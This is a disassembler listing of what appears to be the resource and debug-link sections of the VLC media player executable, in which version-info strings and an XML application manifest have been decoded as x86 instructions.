  42627f:	add    BYTE PTR [esi+0x0],ch
  426282:	add    BYTE PTR fs:[eax],ah
  426285:	add    BYTE PTR [esi+0x0],dl
  426288:	dec    esp
  426289:	add    BYTE PTR [ebx+0x0],al
  42628c:	and    BYTE PTR [eax],al
  42628e:	inc    ecx
  42628f:	add    BYTE PTR [ebp+0x0],dh
  426292:	je     0x426294
  426294:	push   0x72006f00
  426299:	add    BYTE PTR [ebx+0x0],dh
  42629c:	add    BYTE PTR [eax],al
  42629e:	add    BYTE PTR [eax],al
  4262a0:	rol    BYTE PTR [eax],0x4c
  4262a3:	add    BYTE PTR [ecx],al
  4262a5:	add    BYTE PTR [eax+eax*1+0x65],cl
  4262a9:	add    BYTE PTR [edi+0x0],ah
  4262ac:	popa   
  4262ad:	add    BYTE PTR [eax+eax*1+0x54],ch
  4262b1:	add    BYTE PTR [edx+0x0],dh
  4262b4:	popa   
  4262b5:	add    BYTE PTR [eax+eax*1+0x65],ah
  4262b9:	add    BYTE PTR [ebp+0x0],ch
  4262bc:	popa   
  4262bd:	add    BYTE PTR [edx+0x0],dh
  4262c0:	imul   eax,DWORD PTR [eax],0x73
  4262c3:	add    BYTE PTR [eax],al
  4262c5:	add    BYTE PTR [eax],al
  4262c7:	add    BYTE PTR [esi+0x0],dl
  4262ca:	dec    esp
  4262cb:	add    BYTE PTR [ebx+0x0],al
  4262ce:	and    BYTE PTR [eax],al
  4262d0:	ins    DWORD PTR es:[edi],dx
  4262d1:	add    BYTE PTR [ebp+0x0],ah
  4262d4:	add    BYTE PTR fs:[ecx+0x0],ch
  4262d8:	popa   
  4262d9:	add    BYTE PTR [eax],ah
  4262db:	add    BYTE PTR [eax+0x0],dh
  4262de:	ins    BYTE PTR es:[edi],dx
  4262df:	add    BYTE PTR [ecx+0x0],ah
  4262e2:	jns    0x4262e4
  4262e4:	add    BYTE PTR gs:[edx+0x0],dh
  4262e8:	sub    al,0x0
  4262ea:	and    BYTE PTR [eax],al
  4262ec:	push   esi
  4262ed:	add    BYTE PTR [ecx+0x0],ch
  4262f0:	add    BYTE PTR fs:[ebp+0x0],ah
  4262f4:	outs   dx,DWORD PTR ds:[esi]
  4262f5:	add    BYTE PTR [eax+eax*1+0x41],cl
  4262f9:	add    BYTE PTR [esi+0x0],cl
  4262fc:	and    BYTE PTR [eax],al
  4262fe:	popa   
  4262ff:	add    BYTE PTR [esi+0x0],ch
  426302:	add    BYTE PTR fs:[eax],ah
  426305:	add    BYTE PTR [eax+0x0],bh
  426308:	xor    al,BYTE PTR [eax]
  42630a:	add    BYTE PTR ss:[eax+eax*1],dh
  42630e:	and    BYTE PTR [eax],al
  426310:	popa   
  426311:	add    BYTE PTR [edx+0x0],dh
  426314:	add    BYTE PTR gs:[eax],ah
  426317:	add    BYTE PTR [edx+0x0],dh
  42631a:	add    BYTE PTR gs:[edi+0x0],ah
  42631e:	imul   eax,DWORD PTR [eax],0x740073
  426324:	add    BYTE PTR gs:[edx+0x0],dh
  426328:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  42632d:	add    BYTE PTR [eax+eax*1+0x72],dh
  426331:	add    BYTE PTR [ecx+0x0],ah
  426334:	add    BYTE PTR fs:[ebp+0x0],ah
  426338:	ins    DWORD PTR es:[edi],dx
  426339:	add    BYTE PTR [ecx+0x0],ah
  42633c:	jb     0x42633e
  42633e:	imul   eax,DWORD PTR [eax],0x73
  426341:	add    BYTE PTR [eax],ah
  426343:	add    BYTE PTR [esi+0x0],ah
  426346:	jb     0x426348
  426348:	outs   dx,DWORD PTR ds:[esi]
  426349:	add    BYTE PTR [ebp+0x0],ch
  42634c:	and    BYTE PTR [eax],al
  42634e:	push   esi
  42634f:	add    BYTE PTR [ecx+0x0],ch
  426352:	add    BYTE PTR fs:[ebp+0x0],ah
  426356:	outs   dx,DWORD PTR ds:[esi]
  426357:	add    BYTE PTR [eax+eax*1+0x41],cl
  42635b:	add    BYTE PTR [esi+0x0],cl
  42635e:	add    BYTE PTR [eax],al
  426360:	inc    esp
  426361:	add    BYTE PTR [eax],al
  426363:	add    BYTE PTR [ecx],al
  426365:	add    BYTE PTR [esi+0x0],dl
  426368:	popa   
  426369:	add    BYTE PTR [edx+0x0],dh
  42636c:	inc    esi
  42636d:	add    BYTE PTR [ecx+0x0],ch
  426370:	ins    BYTE PTR es:[edi],dx
  426371:	add    BYTE PTR [ebp+0x0],ah
  426374:	dec    ecx
  426375:	add    BYTE PTR [esi+0x0],ch
  426378:	data16 add BYTE PTR [edi+0x0],ch
  42637c:	add    BYTE PTR [eax],al
  42637e:	add    BYTE PTR [eax],al
  426380:	and    al,0x0
  426382:	add    al,0x0
  426384:	add    BYTE PTR [eax],al
  426386:	push   esp
  426387:	add    BYTE PTR [edx+0x0],dh
  42638a:	popa   
  42638b:	add    BYTE PTR [esi+0x0],ch
  42638e:	jae    0x426390
  426390:	ins    BYTE PTR es:[edi],dx
  426391:	add    BYTE PTR [ecx+0x0],ah
  426394:	je     0x426396
  426396:	imul   eax,DWORD PTR [eax],0x6e006f
  42639c:	add    BYTE PTR [eax],al
  42639e:	add    BYTE PTR [eax],al
  4263a0:	or     DWORD PTR [esp+eiz*8],eax
  4263a3:	add    al,0x0
  4263a5:	add    BYTE PTR [eax],al
  4263a7:	add    bh,ch
  4263a9:	mov    ebx,0x783f3cbf
  4263ae:	ins    DWORD PTR es:[edi],dx
  4263af:	ins    BYTE PTR es:[edi],dx
  4263b0:	and    BYTE PTR [esi+0x65],dh
  4263b3:	jb     0x426428
  4263b5:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4263bc:	xor    BYTE PTR [edx],ah
  4263be:	and    BYTE PTR [ebp+0x6e],ah
  4263c1:	arpl   WORD PTR [edi+0x64],bp
  4263c4:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  4263cb:	inc    esi
  4263cc:	sub    eax,0x73202238
  4263d1:	je     0x426434
  4263d3:	outs   dx,BYTE PTR ds:[esi]
  4263d4:	fs popa 
  4263d6:	ins    BYTE PTR es:[edi],dx
  4263d7:	outs   dx,DWORD PTR ds:[esi]
  4263d8:	outs   dx,BYTE PTR ds:[esi]
  4263d9:	gs cmp eax,0x73657922
  4263df:	and    bh,BYTE PTR [edi]
  4263e1:	or     bh,BYTE PTR ds:[ecx+eiz*2]
  4263e5:	jae    0x42645a
  4263e7:	gs ins DWORD PTR es:[edi],dx
  4263e9:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4263ed:	js     0x42645c
  4263ef:	ins    BYTE PTR es:[edi],dx
  4263f0:	outs   dx,BYTE PTR ds:[esi]
  4263f1:	jae    0x426430
  4263f3:	and    dh,BYTE PTR [ebp+0x72]
  4263f6:	outs   dx,BYTE PTR ds:[esi]
  4263f7:	cmp    dh,BYTE PTR [ebx+0x63]
  4263fa:	push   0x73616d65
  4263ff:	sub    eax,0x7263696d
  426404:	outs   dx,DWORD PTR ds:[esi]
  426405:	jae    0x426476
  426407:	data16 je 0x426437
  42640a:	arpl   WORD PTR [edi+0x6d],bp
  42640d:	cmp    ah,BYTE PTR [ecx+0x73]
  426410:	ins    DWORD PTR es:[edi],dx
  426411:	cs jbe 0x426445
  426414:	and    ah,BYTE PTR [eax]
  426416:	ins    DWORD PTR es:[edi],dx
  426417:	popa   
  426418:	outs   dx,BYTE PTR ds:[esi]
  426419:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  426420:	jb     0x426495
  426422:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  426429:	xor    BYTE PTR [edx],ah
  42642b:	or     ah,BYTE PTR ds:[eax]
  42642e:	and    BYTE PTR [eax],ah
  426430:	and    BYTE PTR [ecx+eiz*2],bh
  426433:	jae    0x4264a8
  426435:	gs ins DWORD PTR es:[edi],dx
  426437:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  42643b:	fs outs dx,BYTE PTR gs:[esi]
  42643e:	je     0x4264a9
  426440:	je     0x4264bb
  426442:	or     ah,BYTE PTR [eax]
  426444:	and    BYTE PTR [eax],ah
  426446:	and    BYTE PTR [eax],ah
  426448:	and    BYTE PTR [eax],ah
  42644a:	and    BYTE PTR [esi+0x65],dh
  42644d:	jb     0x4264c2
  42644f:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  426456:	xor    BYTE PTR [esi],ch
  426458:	xor    BYTE PTR [esi],ch
  42645a:	xor    BYTE PTR [edx],ah
  42645c:	or     ah,BYTE PTR [eax]
  42645e:	and    BYTE PTR [eax],ah
  426460:	and    BYTE PTR [eax],ah
  426462:	and    BYTE PTR [eax],ah
  426464:	and    BYTE PTR [eax+0x72],dh
  426467:	outs   dx,DWORD PTR ds:[esi]
  426468:	arpl   WORD PTR [ebp+0x73],sp
  42646b:	jae    0x4264dc
  42646d:	jb     0x4264b0
  42646f:	jb     0x4264d4
  426471:	push   0x63657469
  426476:	je     0x4264ed
  426478:	jb     0x4264df
  42647a:	cmp    eax,0xa222a22
  42647f:	and    BYTE PTR [eax],ah
  426481:	and    BYTE PTR [eax],ah
  426483:	and    BYTE PTR [eax],ah
  426485:	and    BYTE PTR [eax],ah
  426487:	outs   dx,BYTE PTR ds:[esi]
  426488:	popa   
  426489:	ins    DWORD PTR es:[edi],dx
  42648a:	gs cmp eax,0x64695622
  426490:	outs   dx,DWORD PTR gs:[esi]
  426492:	dec    esp
  426493:	inc    ecx
  426494:	dec    esi
  426495:	cs push esi
  426497:	dec    esp
  426498:	inc    ebx
  426499:	and    cl,BYTE PTR [edx]
  42649b:	and    BYTE PTR [eax],ah
  42649d:	and    BYTE PTR [eax],ah
  42649f:	and    BYTE PTR [eax],ah
  4264a1:	and    BYTE PTR [eax],ah
  4264a3:	je     0x42651e
  4264a5:	jo     0x42650c
  4264a7:	cmp    eax,0x6e697722
  4264ac:	xor    esi,DWORD PTR [edx]
  4264ae:	and    cl,BYTE PTR [edx]
  4264b0:	and    BYTE PTR [eax],ah
  4264b2:	and    BYTE PTR [eax],ah
  4264b4:	das    
  4264b5:	or     ah,BYTE PTR ds:[eax]
  4264b8:	and    BYTE PTR [eax],ah
  4264ba:	and    BYTE PTR [esp+eiz*2],bh
  4264bd:	gs jae 0x426523
  4264c0:	jb     0x42652b
  4264c2:	jo     0x426538
  4264c4:	imul   ebp,DWORD PTR [edi+0x6e],0x6565733e
  4264cb:	and    BYTE PTR [eax+0x74],ch
  4264ce:	je     0x426540
  4264d0:	cmp    ch,BYTE PTR [edi]
  4264d2:	das    
  4264d3:	ja     0x42654c
  4264d5:	ja     0x426505
  4264d7:	jbe    0x426542
  4264d9:	fs outs dx,DWORD PTR gs:[esi]
  4264dc:	ins    BYTE PTR es:[edi],dx
  4264dd:	popa   
  4264de:	outs   dx,BYTE PTR ds:[esi]
  4264df:	outs   dx,DWORD PTR cs:[esi]
  4264e1:	jb     0x42654a
  4264e3:	das    
  4264e4:	cmp    al,0x2f
  4264e6:	fs gs jae 0x42654d
  4264ea:	jb     0x426555
  4264ec:	jo     0x426562
  4264ee:	imul   ebp,DWORD PTR [edi+0x6e],0x20200a3e
  4264f5:	and    BYTE PTR [eax],ah
  4264f7:	and    BYTE PTR [esp+esi*2],bh
  4264fa:	jb     0x426571
  4264fc:	jae    0x426572
  4264fe:	dec    ecx
  4264ff:	outs   dx,BYTE PTR ds:[esi]
  426500:	outs   dx,WORD PTR ds:[esi]
  426502:	and    BYTE PTR [eax+0x6d],bh
  426505:	ins    BYTE PTR es:[edi],dx
  426506:	outs   dx,BYTE PTR ds:[esi]
  426507:	jae    0x426546
  426509:	and    dh,BYTE PTR [ebp+0x72]
  42650c:	outs   dx,BYTE PTR ds:[esi]
  42650d:	cmp    dh,BYTE PTR [ebx+0x63]
  426510:	push   0x73616d65
  426515:	sub    eax,0x7263696d
  42651a:	outs   dx,DWORD PTR ds:[esi]
  42651b:	jae    0x42658c
  42651d:	data16 je 0x42654d
  426520:	arpl   WORD PTR [edi+0x6d],bp
  426523:	cmp    ah,BYTE PTR [ecx+0x73]
  426526:	ins    DWORD PTR es:[edi],dx
  426527:	cs jbe 0x42655d
  42652a:	and    bh,BYTE PTR [esi]
  42652c:	or     ah,BYTE PTR [eax]
  42652e:	and    BYTE PTR [eax],ah
  426530:	and    BYTE PTR [eax],ah
  426532:	and    BYTE PTR [eax],ah
  426534:	and    BYTE PTR [ebx+esi*2],bh
  426537:	arpl   WORD PTR gs:[ebp+0x72],si
  42653b:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2020200a
  426543:	and    BYTE PTR [eax],ah
  426545:	and    BYTE PTR [eax],ah
  426547:	and    BYTE PTR [eax],ah
  426549:	and    BYTE PTR [eax],ah
  42654b:	and    BYTE PTR [edx+esi*2],bh
  42654e:	gs jno 0x4265c6
  426551:	gs jae 0x4265c8
  426554:	gs fs push eax
  426557:	jb     0x4265c2
  426559:	jbe    0x4265c4
  42655b:	ins    BYTE PTR es:[edi],dx
  42655c:	gs addr16 gs jae 0x42659f
  426561:	or     ah,BYTE PTR [eax]
  426563:	and    BYTE PTR [eax],ah
  426565:	and    BYTE PTR [eax],ah
  426567:	and    BYTE PTR [eax],ah
  426569:	and    BYTE PTR [eax],ah
  42656b:	and    BYTE PTR [eax],ah
  42656d:	and    BYTE PTR [eax],ah
  42656f:	and    BYTE PTR [eax],ah
  426571:	and    BYTE PTR [edx+esi*2],bh
  426574:	gs jno 0x4265ec
  426577:	gs jae 0x4265ee
  42657a:	gs fs inc ebp
  42657d:	js     0x4265e4
  42657f:	arpl   WORD PTR [ebp+0x74],si
  426582:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  426589:	ins    BYTE PTR es:[edi],dx
  42658a:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  42658e:	gs ins BYTE PTR es:[edi],dx
  426590:	cmp    eax,0x49736122
  426595:	outs   dx,BYTE PTR ds:[esi]
  426596:	jbe    0x426607
  426598:	imul   esp,DWORD PTR [ebp+0x72],0x22
  42659c:	and    BYTE PTR [edi],ch
  42659e:	or     ah,BYTE PTR ds:[eax]
  4265a1:	and    BYTE PTR [eax],ah
  4265a3:	and    BYTE PTR [eax],ah
  4265a5:	and    BYTE PTR [eax],ah
  4265a7:	and    BYTE PTR [eax],ah
  4265a9:	and    BYTE PTR [eax],ah
  4265ab:	and    BYTE PTR [edi+ebp*1],bh
  4265ae:	jb     0x426615
  4265b0:	jno    0x426627
  4265b2:	gs jae 0x426629
  4265b5:	gs fs push eax
  4265b8:	jb     0x426623
  4265ba:	jbe    0x426625
  4265bc:	ins    BYTE PTR es:[edi],dx
  4265bd:	gs addr16 gs jae 0x426600
  4265c2:	or     ah,BYTE PTR [eax]
  4265c4:	and    BYTE PTR [eax],ah
  4265c6:	and    BYTE PTR [eax],ah
  4265c8:	and    BYTE PTR [eax],ah
  4265ca:	and    BYTE PTR [edi+ebp*1],bh
  4265cd:	jae    0x426634
  4265cf:	arpl   WORD PTR [ebp+0x72],si
  4265d2:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2020200a
  4265da:	and    BYTE PTR [edi+ebp*1],bh
  4265dd:	je     0x426651
  4265df:	jne    0x426654
  4265e1:	je     0x42662c
  4265e3:	outs   dx,BYTE PTR ds:[esi]
  4265e4:	outs   dx,WORD PTR ds:[esi]
  4265e6:	or     ah,BYTE PTR ds:[eax]
  4265e9:	and    BYTE PTR [eax],ah
  4265eb:	and    BYTE PTR [esp+eiz*2],bh
  4265ee:	gs jo  0x426656
  4265f1:	outs   dx,BYTE PTR ds:[esi]
  4265f2:	fs outs dx,BYTE PTR gs:[esi]
  4265f5:	arpl   WORD PTR [ecx+0x3e],di
  4265f8:	or     ah,BYTE PTR [eax]
  4265fa:	and    BYTE PTR [eax],ah
  4265fc:	and    BYTE PTR [eax],ah
  4265fe:	and    BYTE PTR [eax],ah
  426600:	and    BYTE PTR [esp+eiz*2],bh
  426603:	gs jo  0x42666b
  426606:	outs   dx,BYTE PTR ds:[esi]
  426607:	fs outs dx,BYTE PTR gs:[esi]
  42660a:	je     0x42664d
  42660c:	jae    0x426681
  42660e:	gs ins DWORD PTR es:[edi],dx
  426610:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  426614:	or     ah,BYTE PTR [eax]
  426616:	and    BYTE PTR [eax],ah
  426618:	and    BYTE PTR [eax],ah
  42661a:	and    BYTE PTR [eax],ah
  42661c:	and    BYTE PTR [eax],ah
  42661e:	and    BYTE PTR [eax],ah
  426620:	and    BYTE PTR [ecx+eiz*2],bh
  426623:	jae    0x426698
  426625:	gs ins DWORD PTR es:[edi],dx
  426627:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  42662b:	fs outs dx,BYTE PTR gs:[esi]
  42662e:	je     0x426699
  426630:	je     0x4266ab
  426632:	or     ah,BYTE PTR [eax]
  426634:	and    BYTE PTR [eax],ah
  426636:	and    BYTE PTR [eax],ah
  426638:	and    BYTE PTR [eax],ah
  42663a:	and    BYTE PTR [eax],ah
  42663c:	and    BYTE PTR [eax],ah
  42663e:	and    BYTE PTR [eax],ah
  426640:	and    BYTE PTR [eax],ah
  426642:	and    BYTE PTR [ecx+edi*2+0x70],dh
  426646:	gs cmp eax,0x6e697722
  42664c:	xor    esi,DWORD PTR [edx]
  42664e:	and    cl,BYTE PTR [edx]
  426650:	and    BYTE PTR [eax],ah
  426652:	and    BYTE PTR [eax],ah
  426654:	and    BYTE PTR [eax],ah
  426656:	and    BYTE PTR [eax],ah
  426658:	and    BYTE PTR [eax],ah
  42665a:	and    BYTE PTR [eax],ah
  42665c:	and    BYTE PTR [eax],ah
  42665e:	and    BYTE PTR [eax],ah
  426660:	outs   dx,BYTE PTR ds:[esi]
  426661:	popa   
  426662:	ins    DWORD PTR es:[edi],dx
  426663:	gs cmp eax,0x63694d22
  426669:	jb     0x4266da
  42666b:	jae    0x4266dc
  42666d:	data16 je 0x42669e
  426670:	push   edi
  426671:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  426678:	inc    ebx
  426679:	outs   dx,DWORD PTR ds:[esi]
  42667a:	ins    DWORD PTR es:[edi],dx
  42667b:	ins    DWORD PTR es:[edi],dx
  42667c:	outs   dx,DWORD PTR ds:[esi]
  42667d:	outs   dx,BYTE PTR ds:[esi]
  42667e:	sub    eax,0x746e6f43
  426683:	jb     0x4266f4
  426685:	ins    BYTE PTR es:[edi],dx
  426686:	jae    0x4266aa
  426688:	or     ah,BYTE PTR [eax]
  42668a:	and    BYTE PTR [eax],ah
  42668c:	and    BYTE PTR [eax],ah
  42668e:	and    BYTE PTR [eax],ah
  426690:	and    BYTE PTR [eax],ah
  426692:	and    BYTE PTR [eax],ah
  426694:	and    BYTE PTR [eax],ah
  426696:	and    BYTE PTR [eax],ah
  426698:	and    BYTE PTR [esi+0x65],dh
  42669b:	jb     0x426710
  42669d:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  4266a4:	xor    BYTE PTR [esi],ch
  4266a6:	xor    BYTE PTR [esi],ch
  4266a8:	xor    BYTE PTR [edx],ah
  4266aa:	or     ah,BYTE PTR [eax]
  4266ac:	and    BYTE PTR [eax],ah
  4266ae:	and    BYTE PTR [eax],ah
  4266b0:	and    BYTE PTR [eax],ah
  4266b2:	and    BYTE PTR [eax],ah
  4266b4:	and    BYTE PTR [eax],ah
  4266b6:	and    BYTE PTR [eax],ah
  4266b8:	and    BYTE PTR [eax],ah
  4266ba:	and    BYTE PTR [eax+0x72],dh
  4266bd:	outs   dx,DWORD PTR ds:[esi]
  4266be:	arpl   WORD PTR [ebp+0x73],sp
  4266c1:	jae    0x426732
  4266c3:	jb     0x426706
  4266c5:	jb     0x42672a
  4266c7:	push   0x63657469
  4266cc:	je     0x426743
  4266ce:	jb     0x426735
  4266d0:	cmp    eax,0xa222a22
  4266d5:	and    BYTE PTR [eax],ah
  4266d7:	and    BYTE PTR [eax],ah
  4266d9:	and    BYTE PTR [eax],ah
  4266db:	and    BYTE PTR [eax],ah
  4266dd:	and    BYTE PTR [eax],ah
  4266df:	and    BYTE PTR [eax],ah
  4266e1:	and    BYTE PTR [eax],ah
  4266e3:	and    BYTE PTR [eax],ah
  4266e5:	jo     0x42675c
  4266e7:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4266eb:	dec    ebx
  4266ec:	gs jns 0x426743
  4266ef:	outs   dx,DWORD PTR ds:[esi]
  4266f0:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4266f4:	and    dh,BYTE PTR [esi]
  4266f6:	xor    eax,0x36623539
  4266fb:	xor    al,0x31
  4266fd:	xor    al,0x34
  4266ff:	arpl   WORD PTR [ebx+0x66],sp
  426702:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  426706:	or     ah,BYTE PTR [eax]
  426708:	and    BYTE PTR [eax],ah
  42670a:	and    BYTE PTR [eax],ah
  42670c:	and    BYTE PTR [eax],ah
  42670e:	and    BYTE PTR [eax],ah
  426710:	and    BYTE PTR [eax],ah
  426712:	and    BYTE PTR [eax],ah
  426714:	and    BYTE PTR [eax],ah
  426716:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  42671a:	addr16 jne 0x42677e
  42671d:	addr16 gs cmp eax,0xa222a22
  426724:	and    BYTE PTR [eax],ah
  426726:	and    BYTE PTR [eax],ah
  426728:	and    BYTE PTR [eax],ah
  42672a:	and    BYTE PTR [eax],ah
  42672c:	and    BYTE PTR [eax],ah
  42672e:	and    BYTE PTR [eax],ah
  426730:	das    
  426731:	or     ah,BYTE PTR ds:[eax]
  426734:	and    BYTE PTR [eax],ah
  426736:	and    BYTE PTR [eax],ah
  426738:	and    BYTE PTR [eax],ah
  42673a:	and    BYTE PTR [edi+ebp*1],bh
  42673d:	fs gs jo 0x4267a6
  426741:	outs   dx,BYTE PTR ds:[esi]
  426742:	fs outs dx,BYTE PTR gs:[esi]
  426745:	je     0x426788
  426747:	jae    0x4267bc
  426749:	gs ins DWORD PTR es:[edi],dx
  42674b:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  42674f:	or     ah,BYTE PTR [eax]
  426751:	and    BYTE PTR [eax],ah
  426753:	and    BYTE PTR [edi+ebp*1],bh
  426756:	fs gs jo 0x4267bf
  42675a:	outs   dx,BYTE PTR ds:[esi]
  42675b:	fs outs dx,BYTE PTR gs:[esi]
  42675e:	arpl   WORD PTR [ecx+0x3e],di
  426761:	or     ah,BYTE PTR [eax]
  426763:	and    BYTE PTR [eax],ah
  426765:	and    BYTE PTR [ebx+eiz*2],bh
  426768:	outs   dx,DWORD PTR ds:[esi]
  426769:	ins    DWORD PTR es:[edi],dx
  42676a:	jo     0x4267cd
  42676c:	je     0x4267d7
  42676e:	bound  ebp,QWORD PTR [ecx+0x6c]
  426771:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6e6c6d78
  426779:	jae    0x4267b8
  42677b:	and    dh,BYTE PTR [ebp+0x72]
  42677e:	outs   dx,BYTE PTR ds:[esi]
  42677f:	cmp    dh,BYTE PTR [ebx+0x63]
  426782:	push   0x73616d65
  426787:	sub    eax,0x7263696d
  42678c:	outs   dx,DWORD PTR ds:[esi]
  42678d:	jae    0x4267fe
  42678f:	data16 je 0x4267bf
  426792:	arpl   WORD PTR [edi+0x6d],bp
  426795:	cmp    ah,BYTE PTR [ebx+0x6f]
  426798:	ins    DWORD PTR es:[edi],dx
  426799:	jo     0x4267fc
  42679b:	je     0x426806
  42679d:	bound  ebp,QWORD PTR [ecx+0x6c]
  4267a0:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x3e223176
  4267a8:	or     ah,BYTE PTR [eax]
  4267aa:	and    BYTE PTR [eax],ah
  4267ac:	and    BYTE PTR [eax],ah
  4267ae:	and    BYTE PTR [eax],ah
  4267b0:	and    BYTE PTR [ecx+eiz*2],bh
  4267b3:	jo     0x426825
  4267b5:	ins    BYTE PTR es:[edi],dx
  4267b6:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4267bd:	or     ah,BYTE PTR ds:[eax]
  4267c0:	and    BYTE PTR [eax],ah
  4267c2:	and    BYTE PTR [eax],ah
  4267c4:	and    BYTE PTR [eax],ah
  4267c6:	and    BYTE PTR [eax],ah
  4267c8:	and    BYTE PTR [eax],ah
  4267ca:	and    BYTE PTR [ecx+eiz*1],bh
  4267cd:	sub    eax,0x6568542d
  4267d2:	and    BYTE PTR [ecx+0x44],cl
  4267d5:	and    BYTE PTR [edx+0x65],ah
  4267d8:	ins    BYTE PTR es:[edi],dx
  4267d9:	outs   dx,DWORD PTR ds:[esi]
  4267da:	ja     0x4267fc
  4267dc:	imul   ebp,DWORD PTR [esi+0x64],0x74616369
  4267e3:	gs jae 0x426806
  4267e6:	popa   
  4267e7:	jo     0x426859
  4267e9:	and    BYTE PTR [ebx+0x75],dh
  4267ec:	jo     0x42685e
  4267ee:	outs   dx,DWORD PTR ds:[esi]
  4267ef:	jb     0x426865
  4267f1:	and    BYTE PTR [esi+0x6f],ah
  4267f4:	jb     0x426816
  4267f6:	push   edi
  4267f7:	imul   ebp,DWORD PTR [esi+0x64],0x2073776f
  4267fe:	push   esi
  4267ff:	imul   esi,DWORD PTR [ebx+0x74],0x2d2d2061
  426806:	or     ah,BYTE PTR ds:[eax]
  426809:	and    BYTE PTR [eax],ah
  42680b:	and    BYTE PTR [eax],ah
  42680d:	and    BYTE PTR [eax],ah
  42680f:	and    BYTE PTR [eax],ah
  426811:	and    BYTE PTR [eax],ah
  426813:	and    BYTE PTR [ebx+esi*2],bh
  426816:	jne    0x426888
  426818:	jo     0x426889
  42681a:	jb     0x426890
  42681c:	gs fs dec edi
  42681f:	push   ebx
  426820:	and    BYTE PTR [ecx+0x64],cl
  426823:	cmp    eax,0x32657b22
  426828:	xor    BYTE PTR [ecx],dh
  42682a:	xor    DWORD PTR [esi*1+0x35312d37],esi
  426831:	xor    al,0x36
  426833:	sub    eax,0x35633334
  426838:	sub    eax,0x65663561
  42683d:	sub    eax,0x64383030
  426842:	gs gs xor esp,DWORD PTR gs:[ebx+esi*1+0x66]
  426849:	xor    BYTE PTR [ebp+0x22],bh
  42684c:	das    
  42684d:	or     ah,BYTE PTR ds:[eax]
  426850:	and    BYTE PTR [eax],ah
  426852:	and    BYTE PTR [eax],ah
  426854:	and    BYTE PTR [eax],ah
  426856:	and    BYTE PTR [edi+ebp*1],bh
  426859:	popa   
  42685a:	jo     0x4268cc
  42685c:	ins    BYTE PTR es:[edi],dx
  42685d:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  426864:	or     ah,BYTE PTR ds:[eax]
  426867:	and    BYTE PTR [eax],ah
  426869:	and    BYTE PTR [edi+ebp*1],bh
  42686c:	arpl   WORD PTR [edi+0x6d],bp
  42686f:	jo     0x4268d2
  426871:	je     0x4268dc
  426873:	bound  ebp,QWORD PTR [ecx+0x6c]
  426876:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x612f3c0a
  42687e:	jae    0x4268f3
  426880:	gs ins DWORD PTR es:[edi],dx
  426882:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  426886:	or     al,BYTE PTR [eax]

Disassembly of section .gnu_debuglink:

00427000 <.gnu_debuglink>:
  427000:	jbe    0x42706e
  427002:	arpl   WORD PTR [esi],bp
  427004:	gs js  0x42706c
  427007:	cs bound esp,QWORD PTR fs:[edi+0x0]
  42700c:	stos   DWORD PTR es:[edi],eax
  42700d:	leave  
  42700e:	.byte 0xc1
  42700f:	xchg   esp,eax
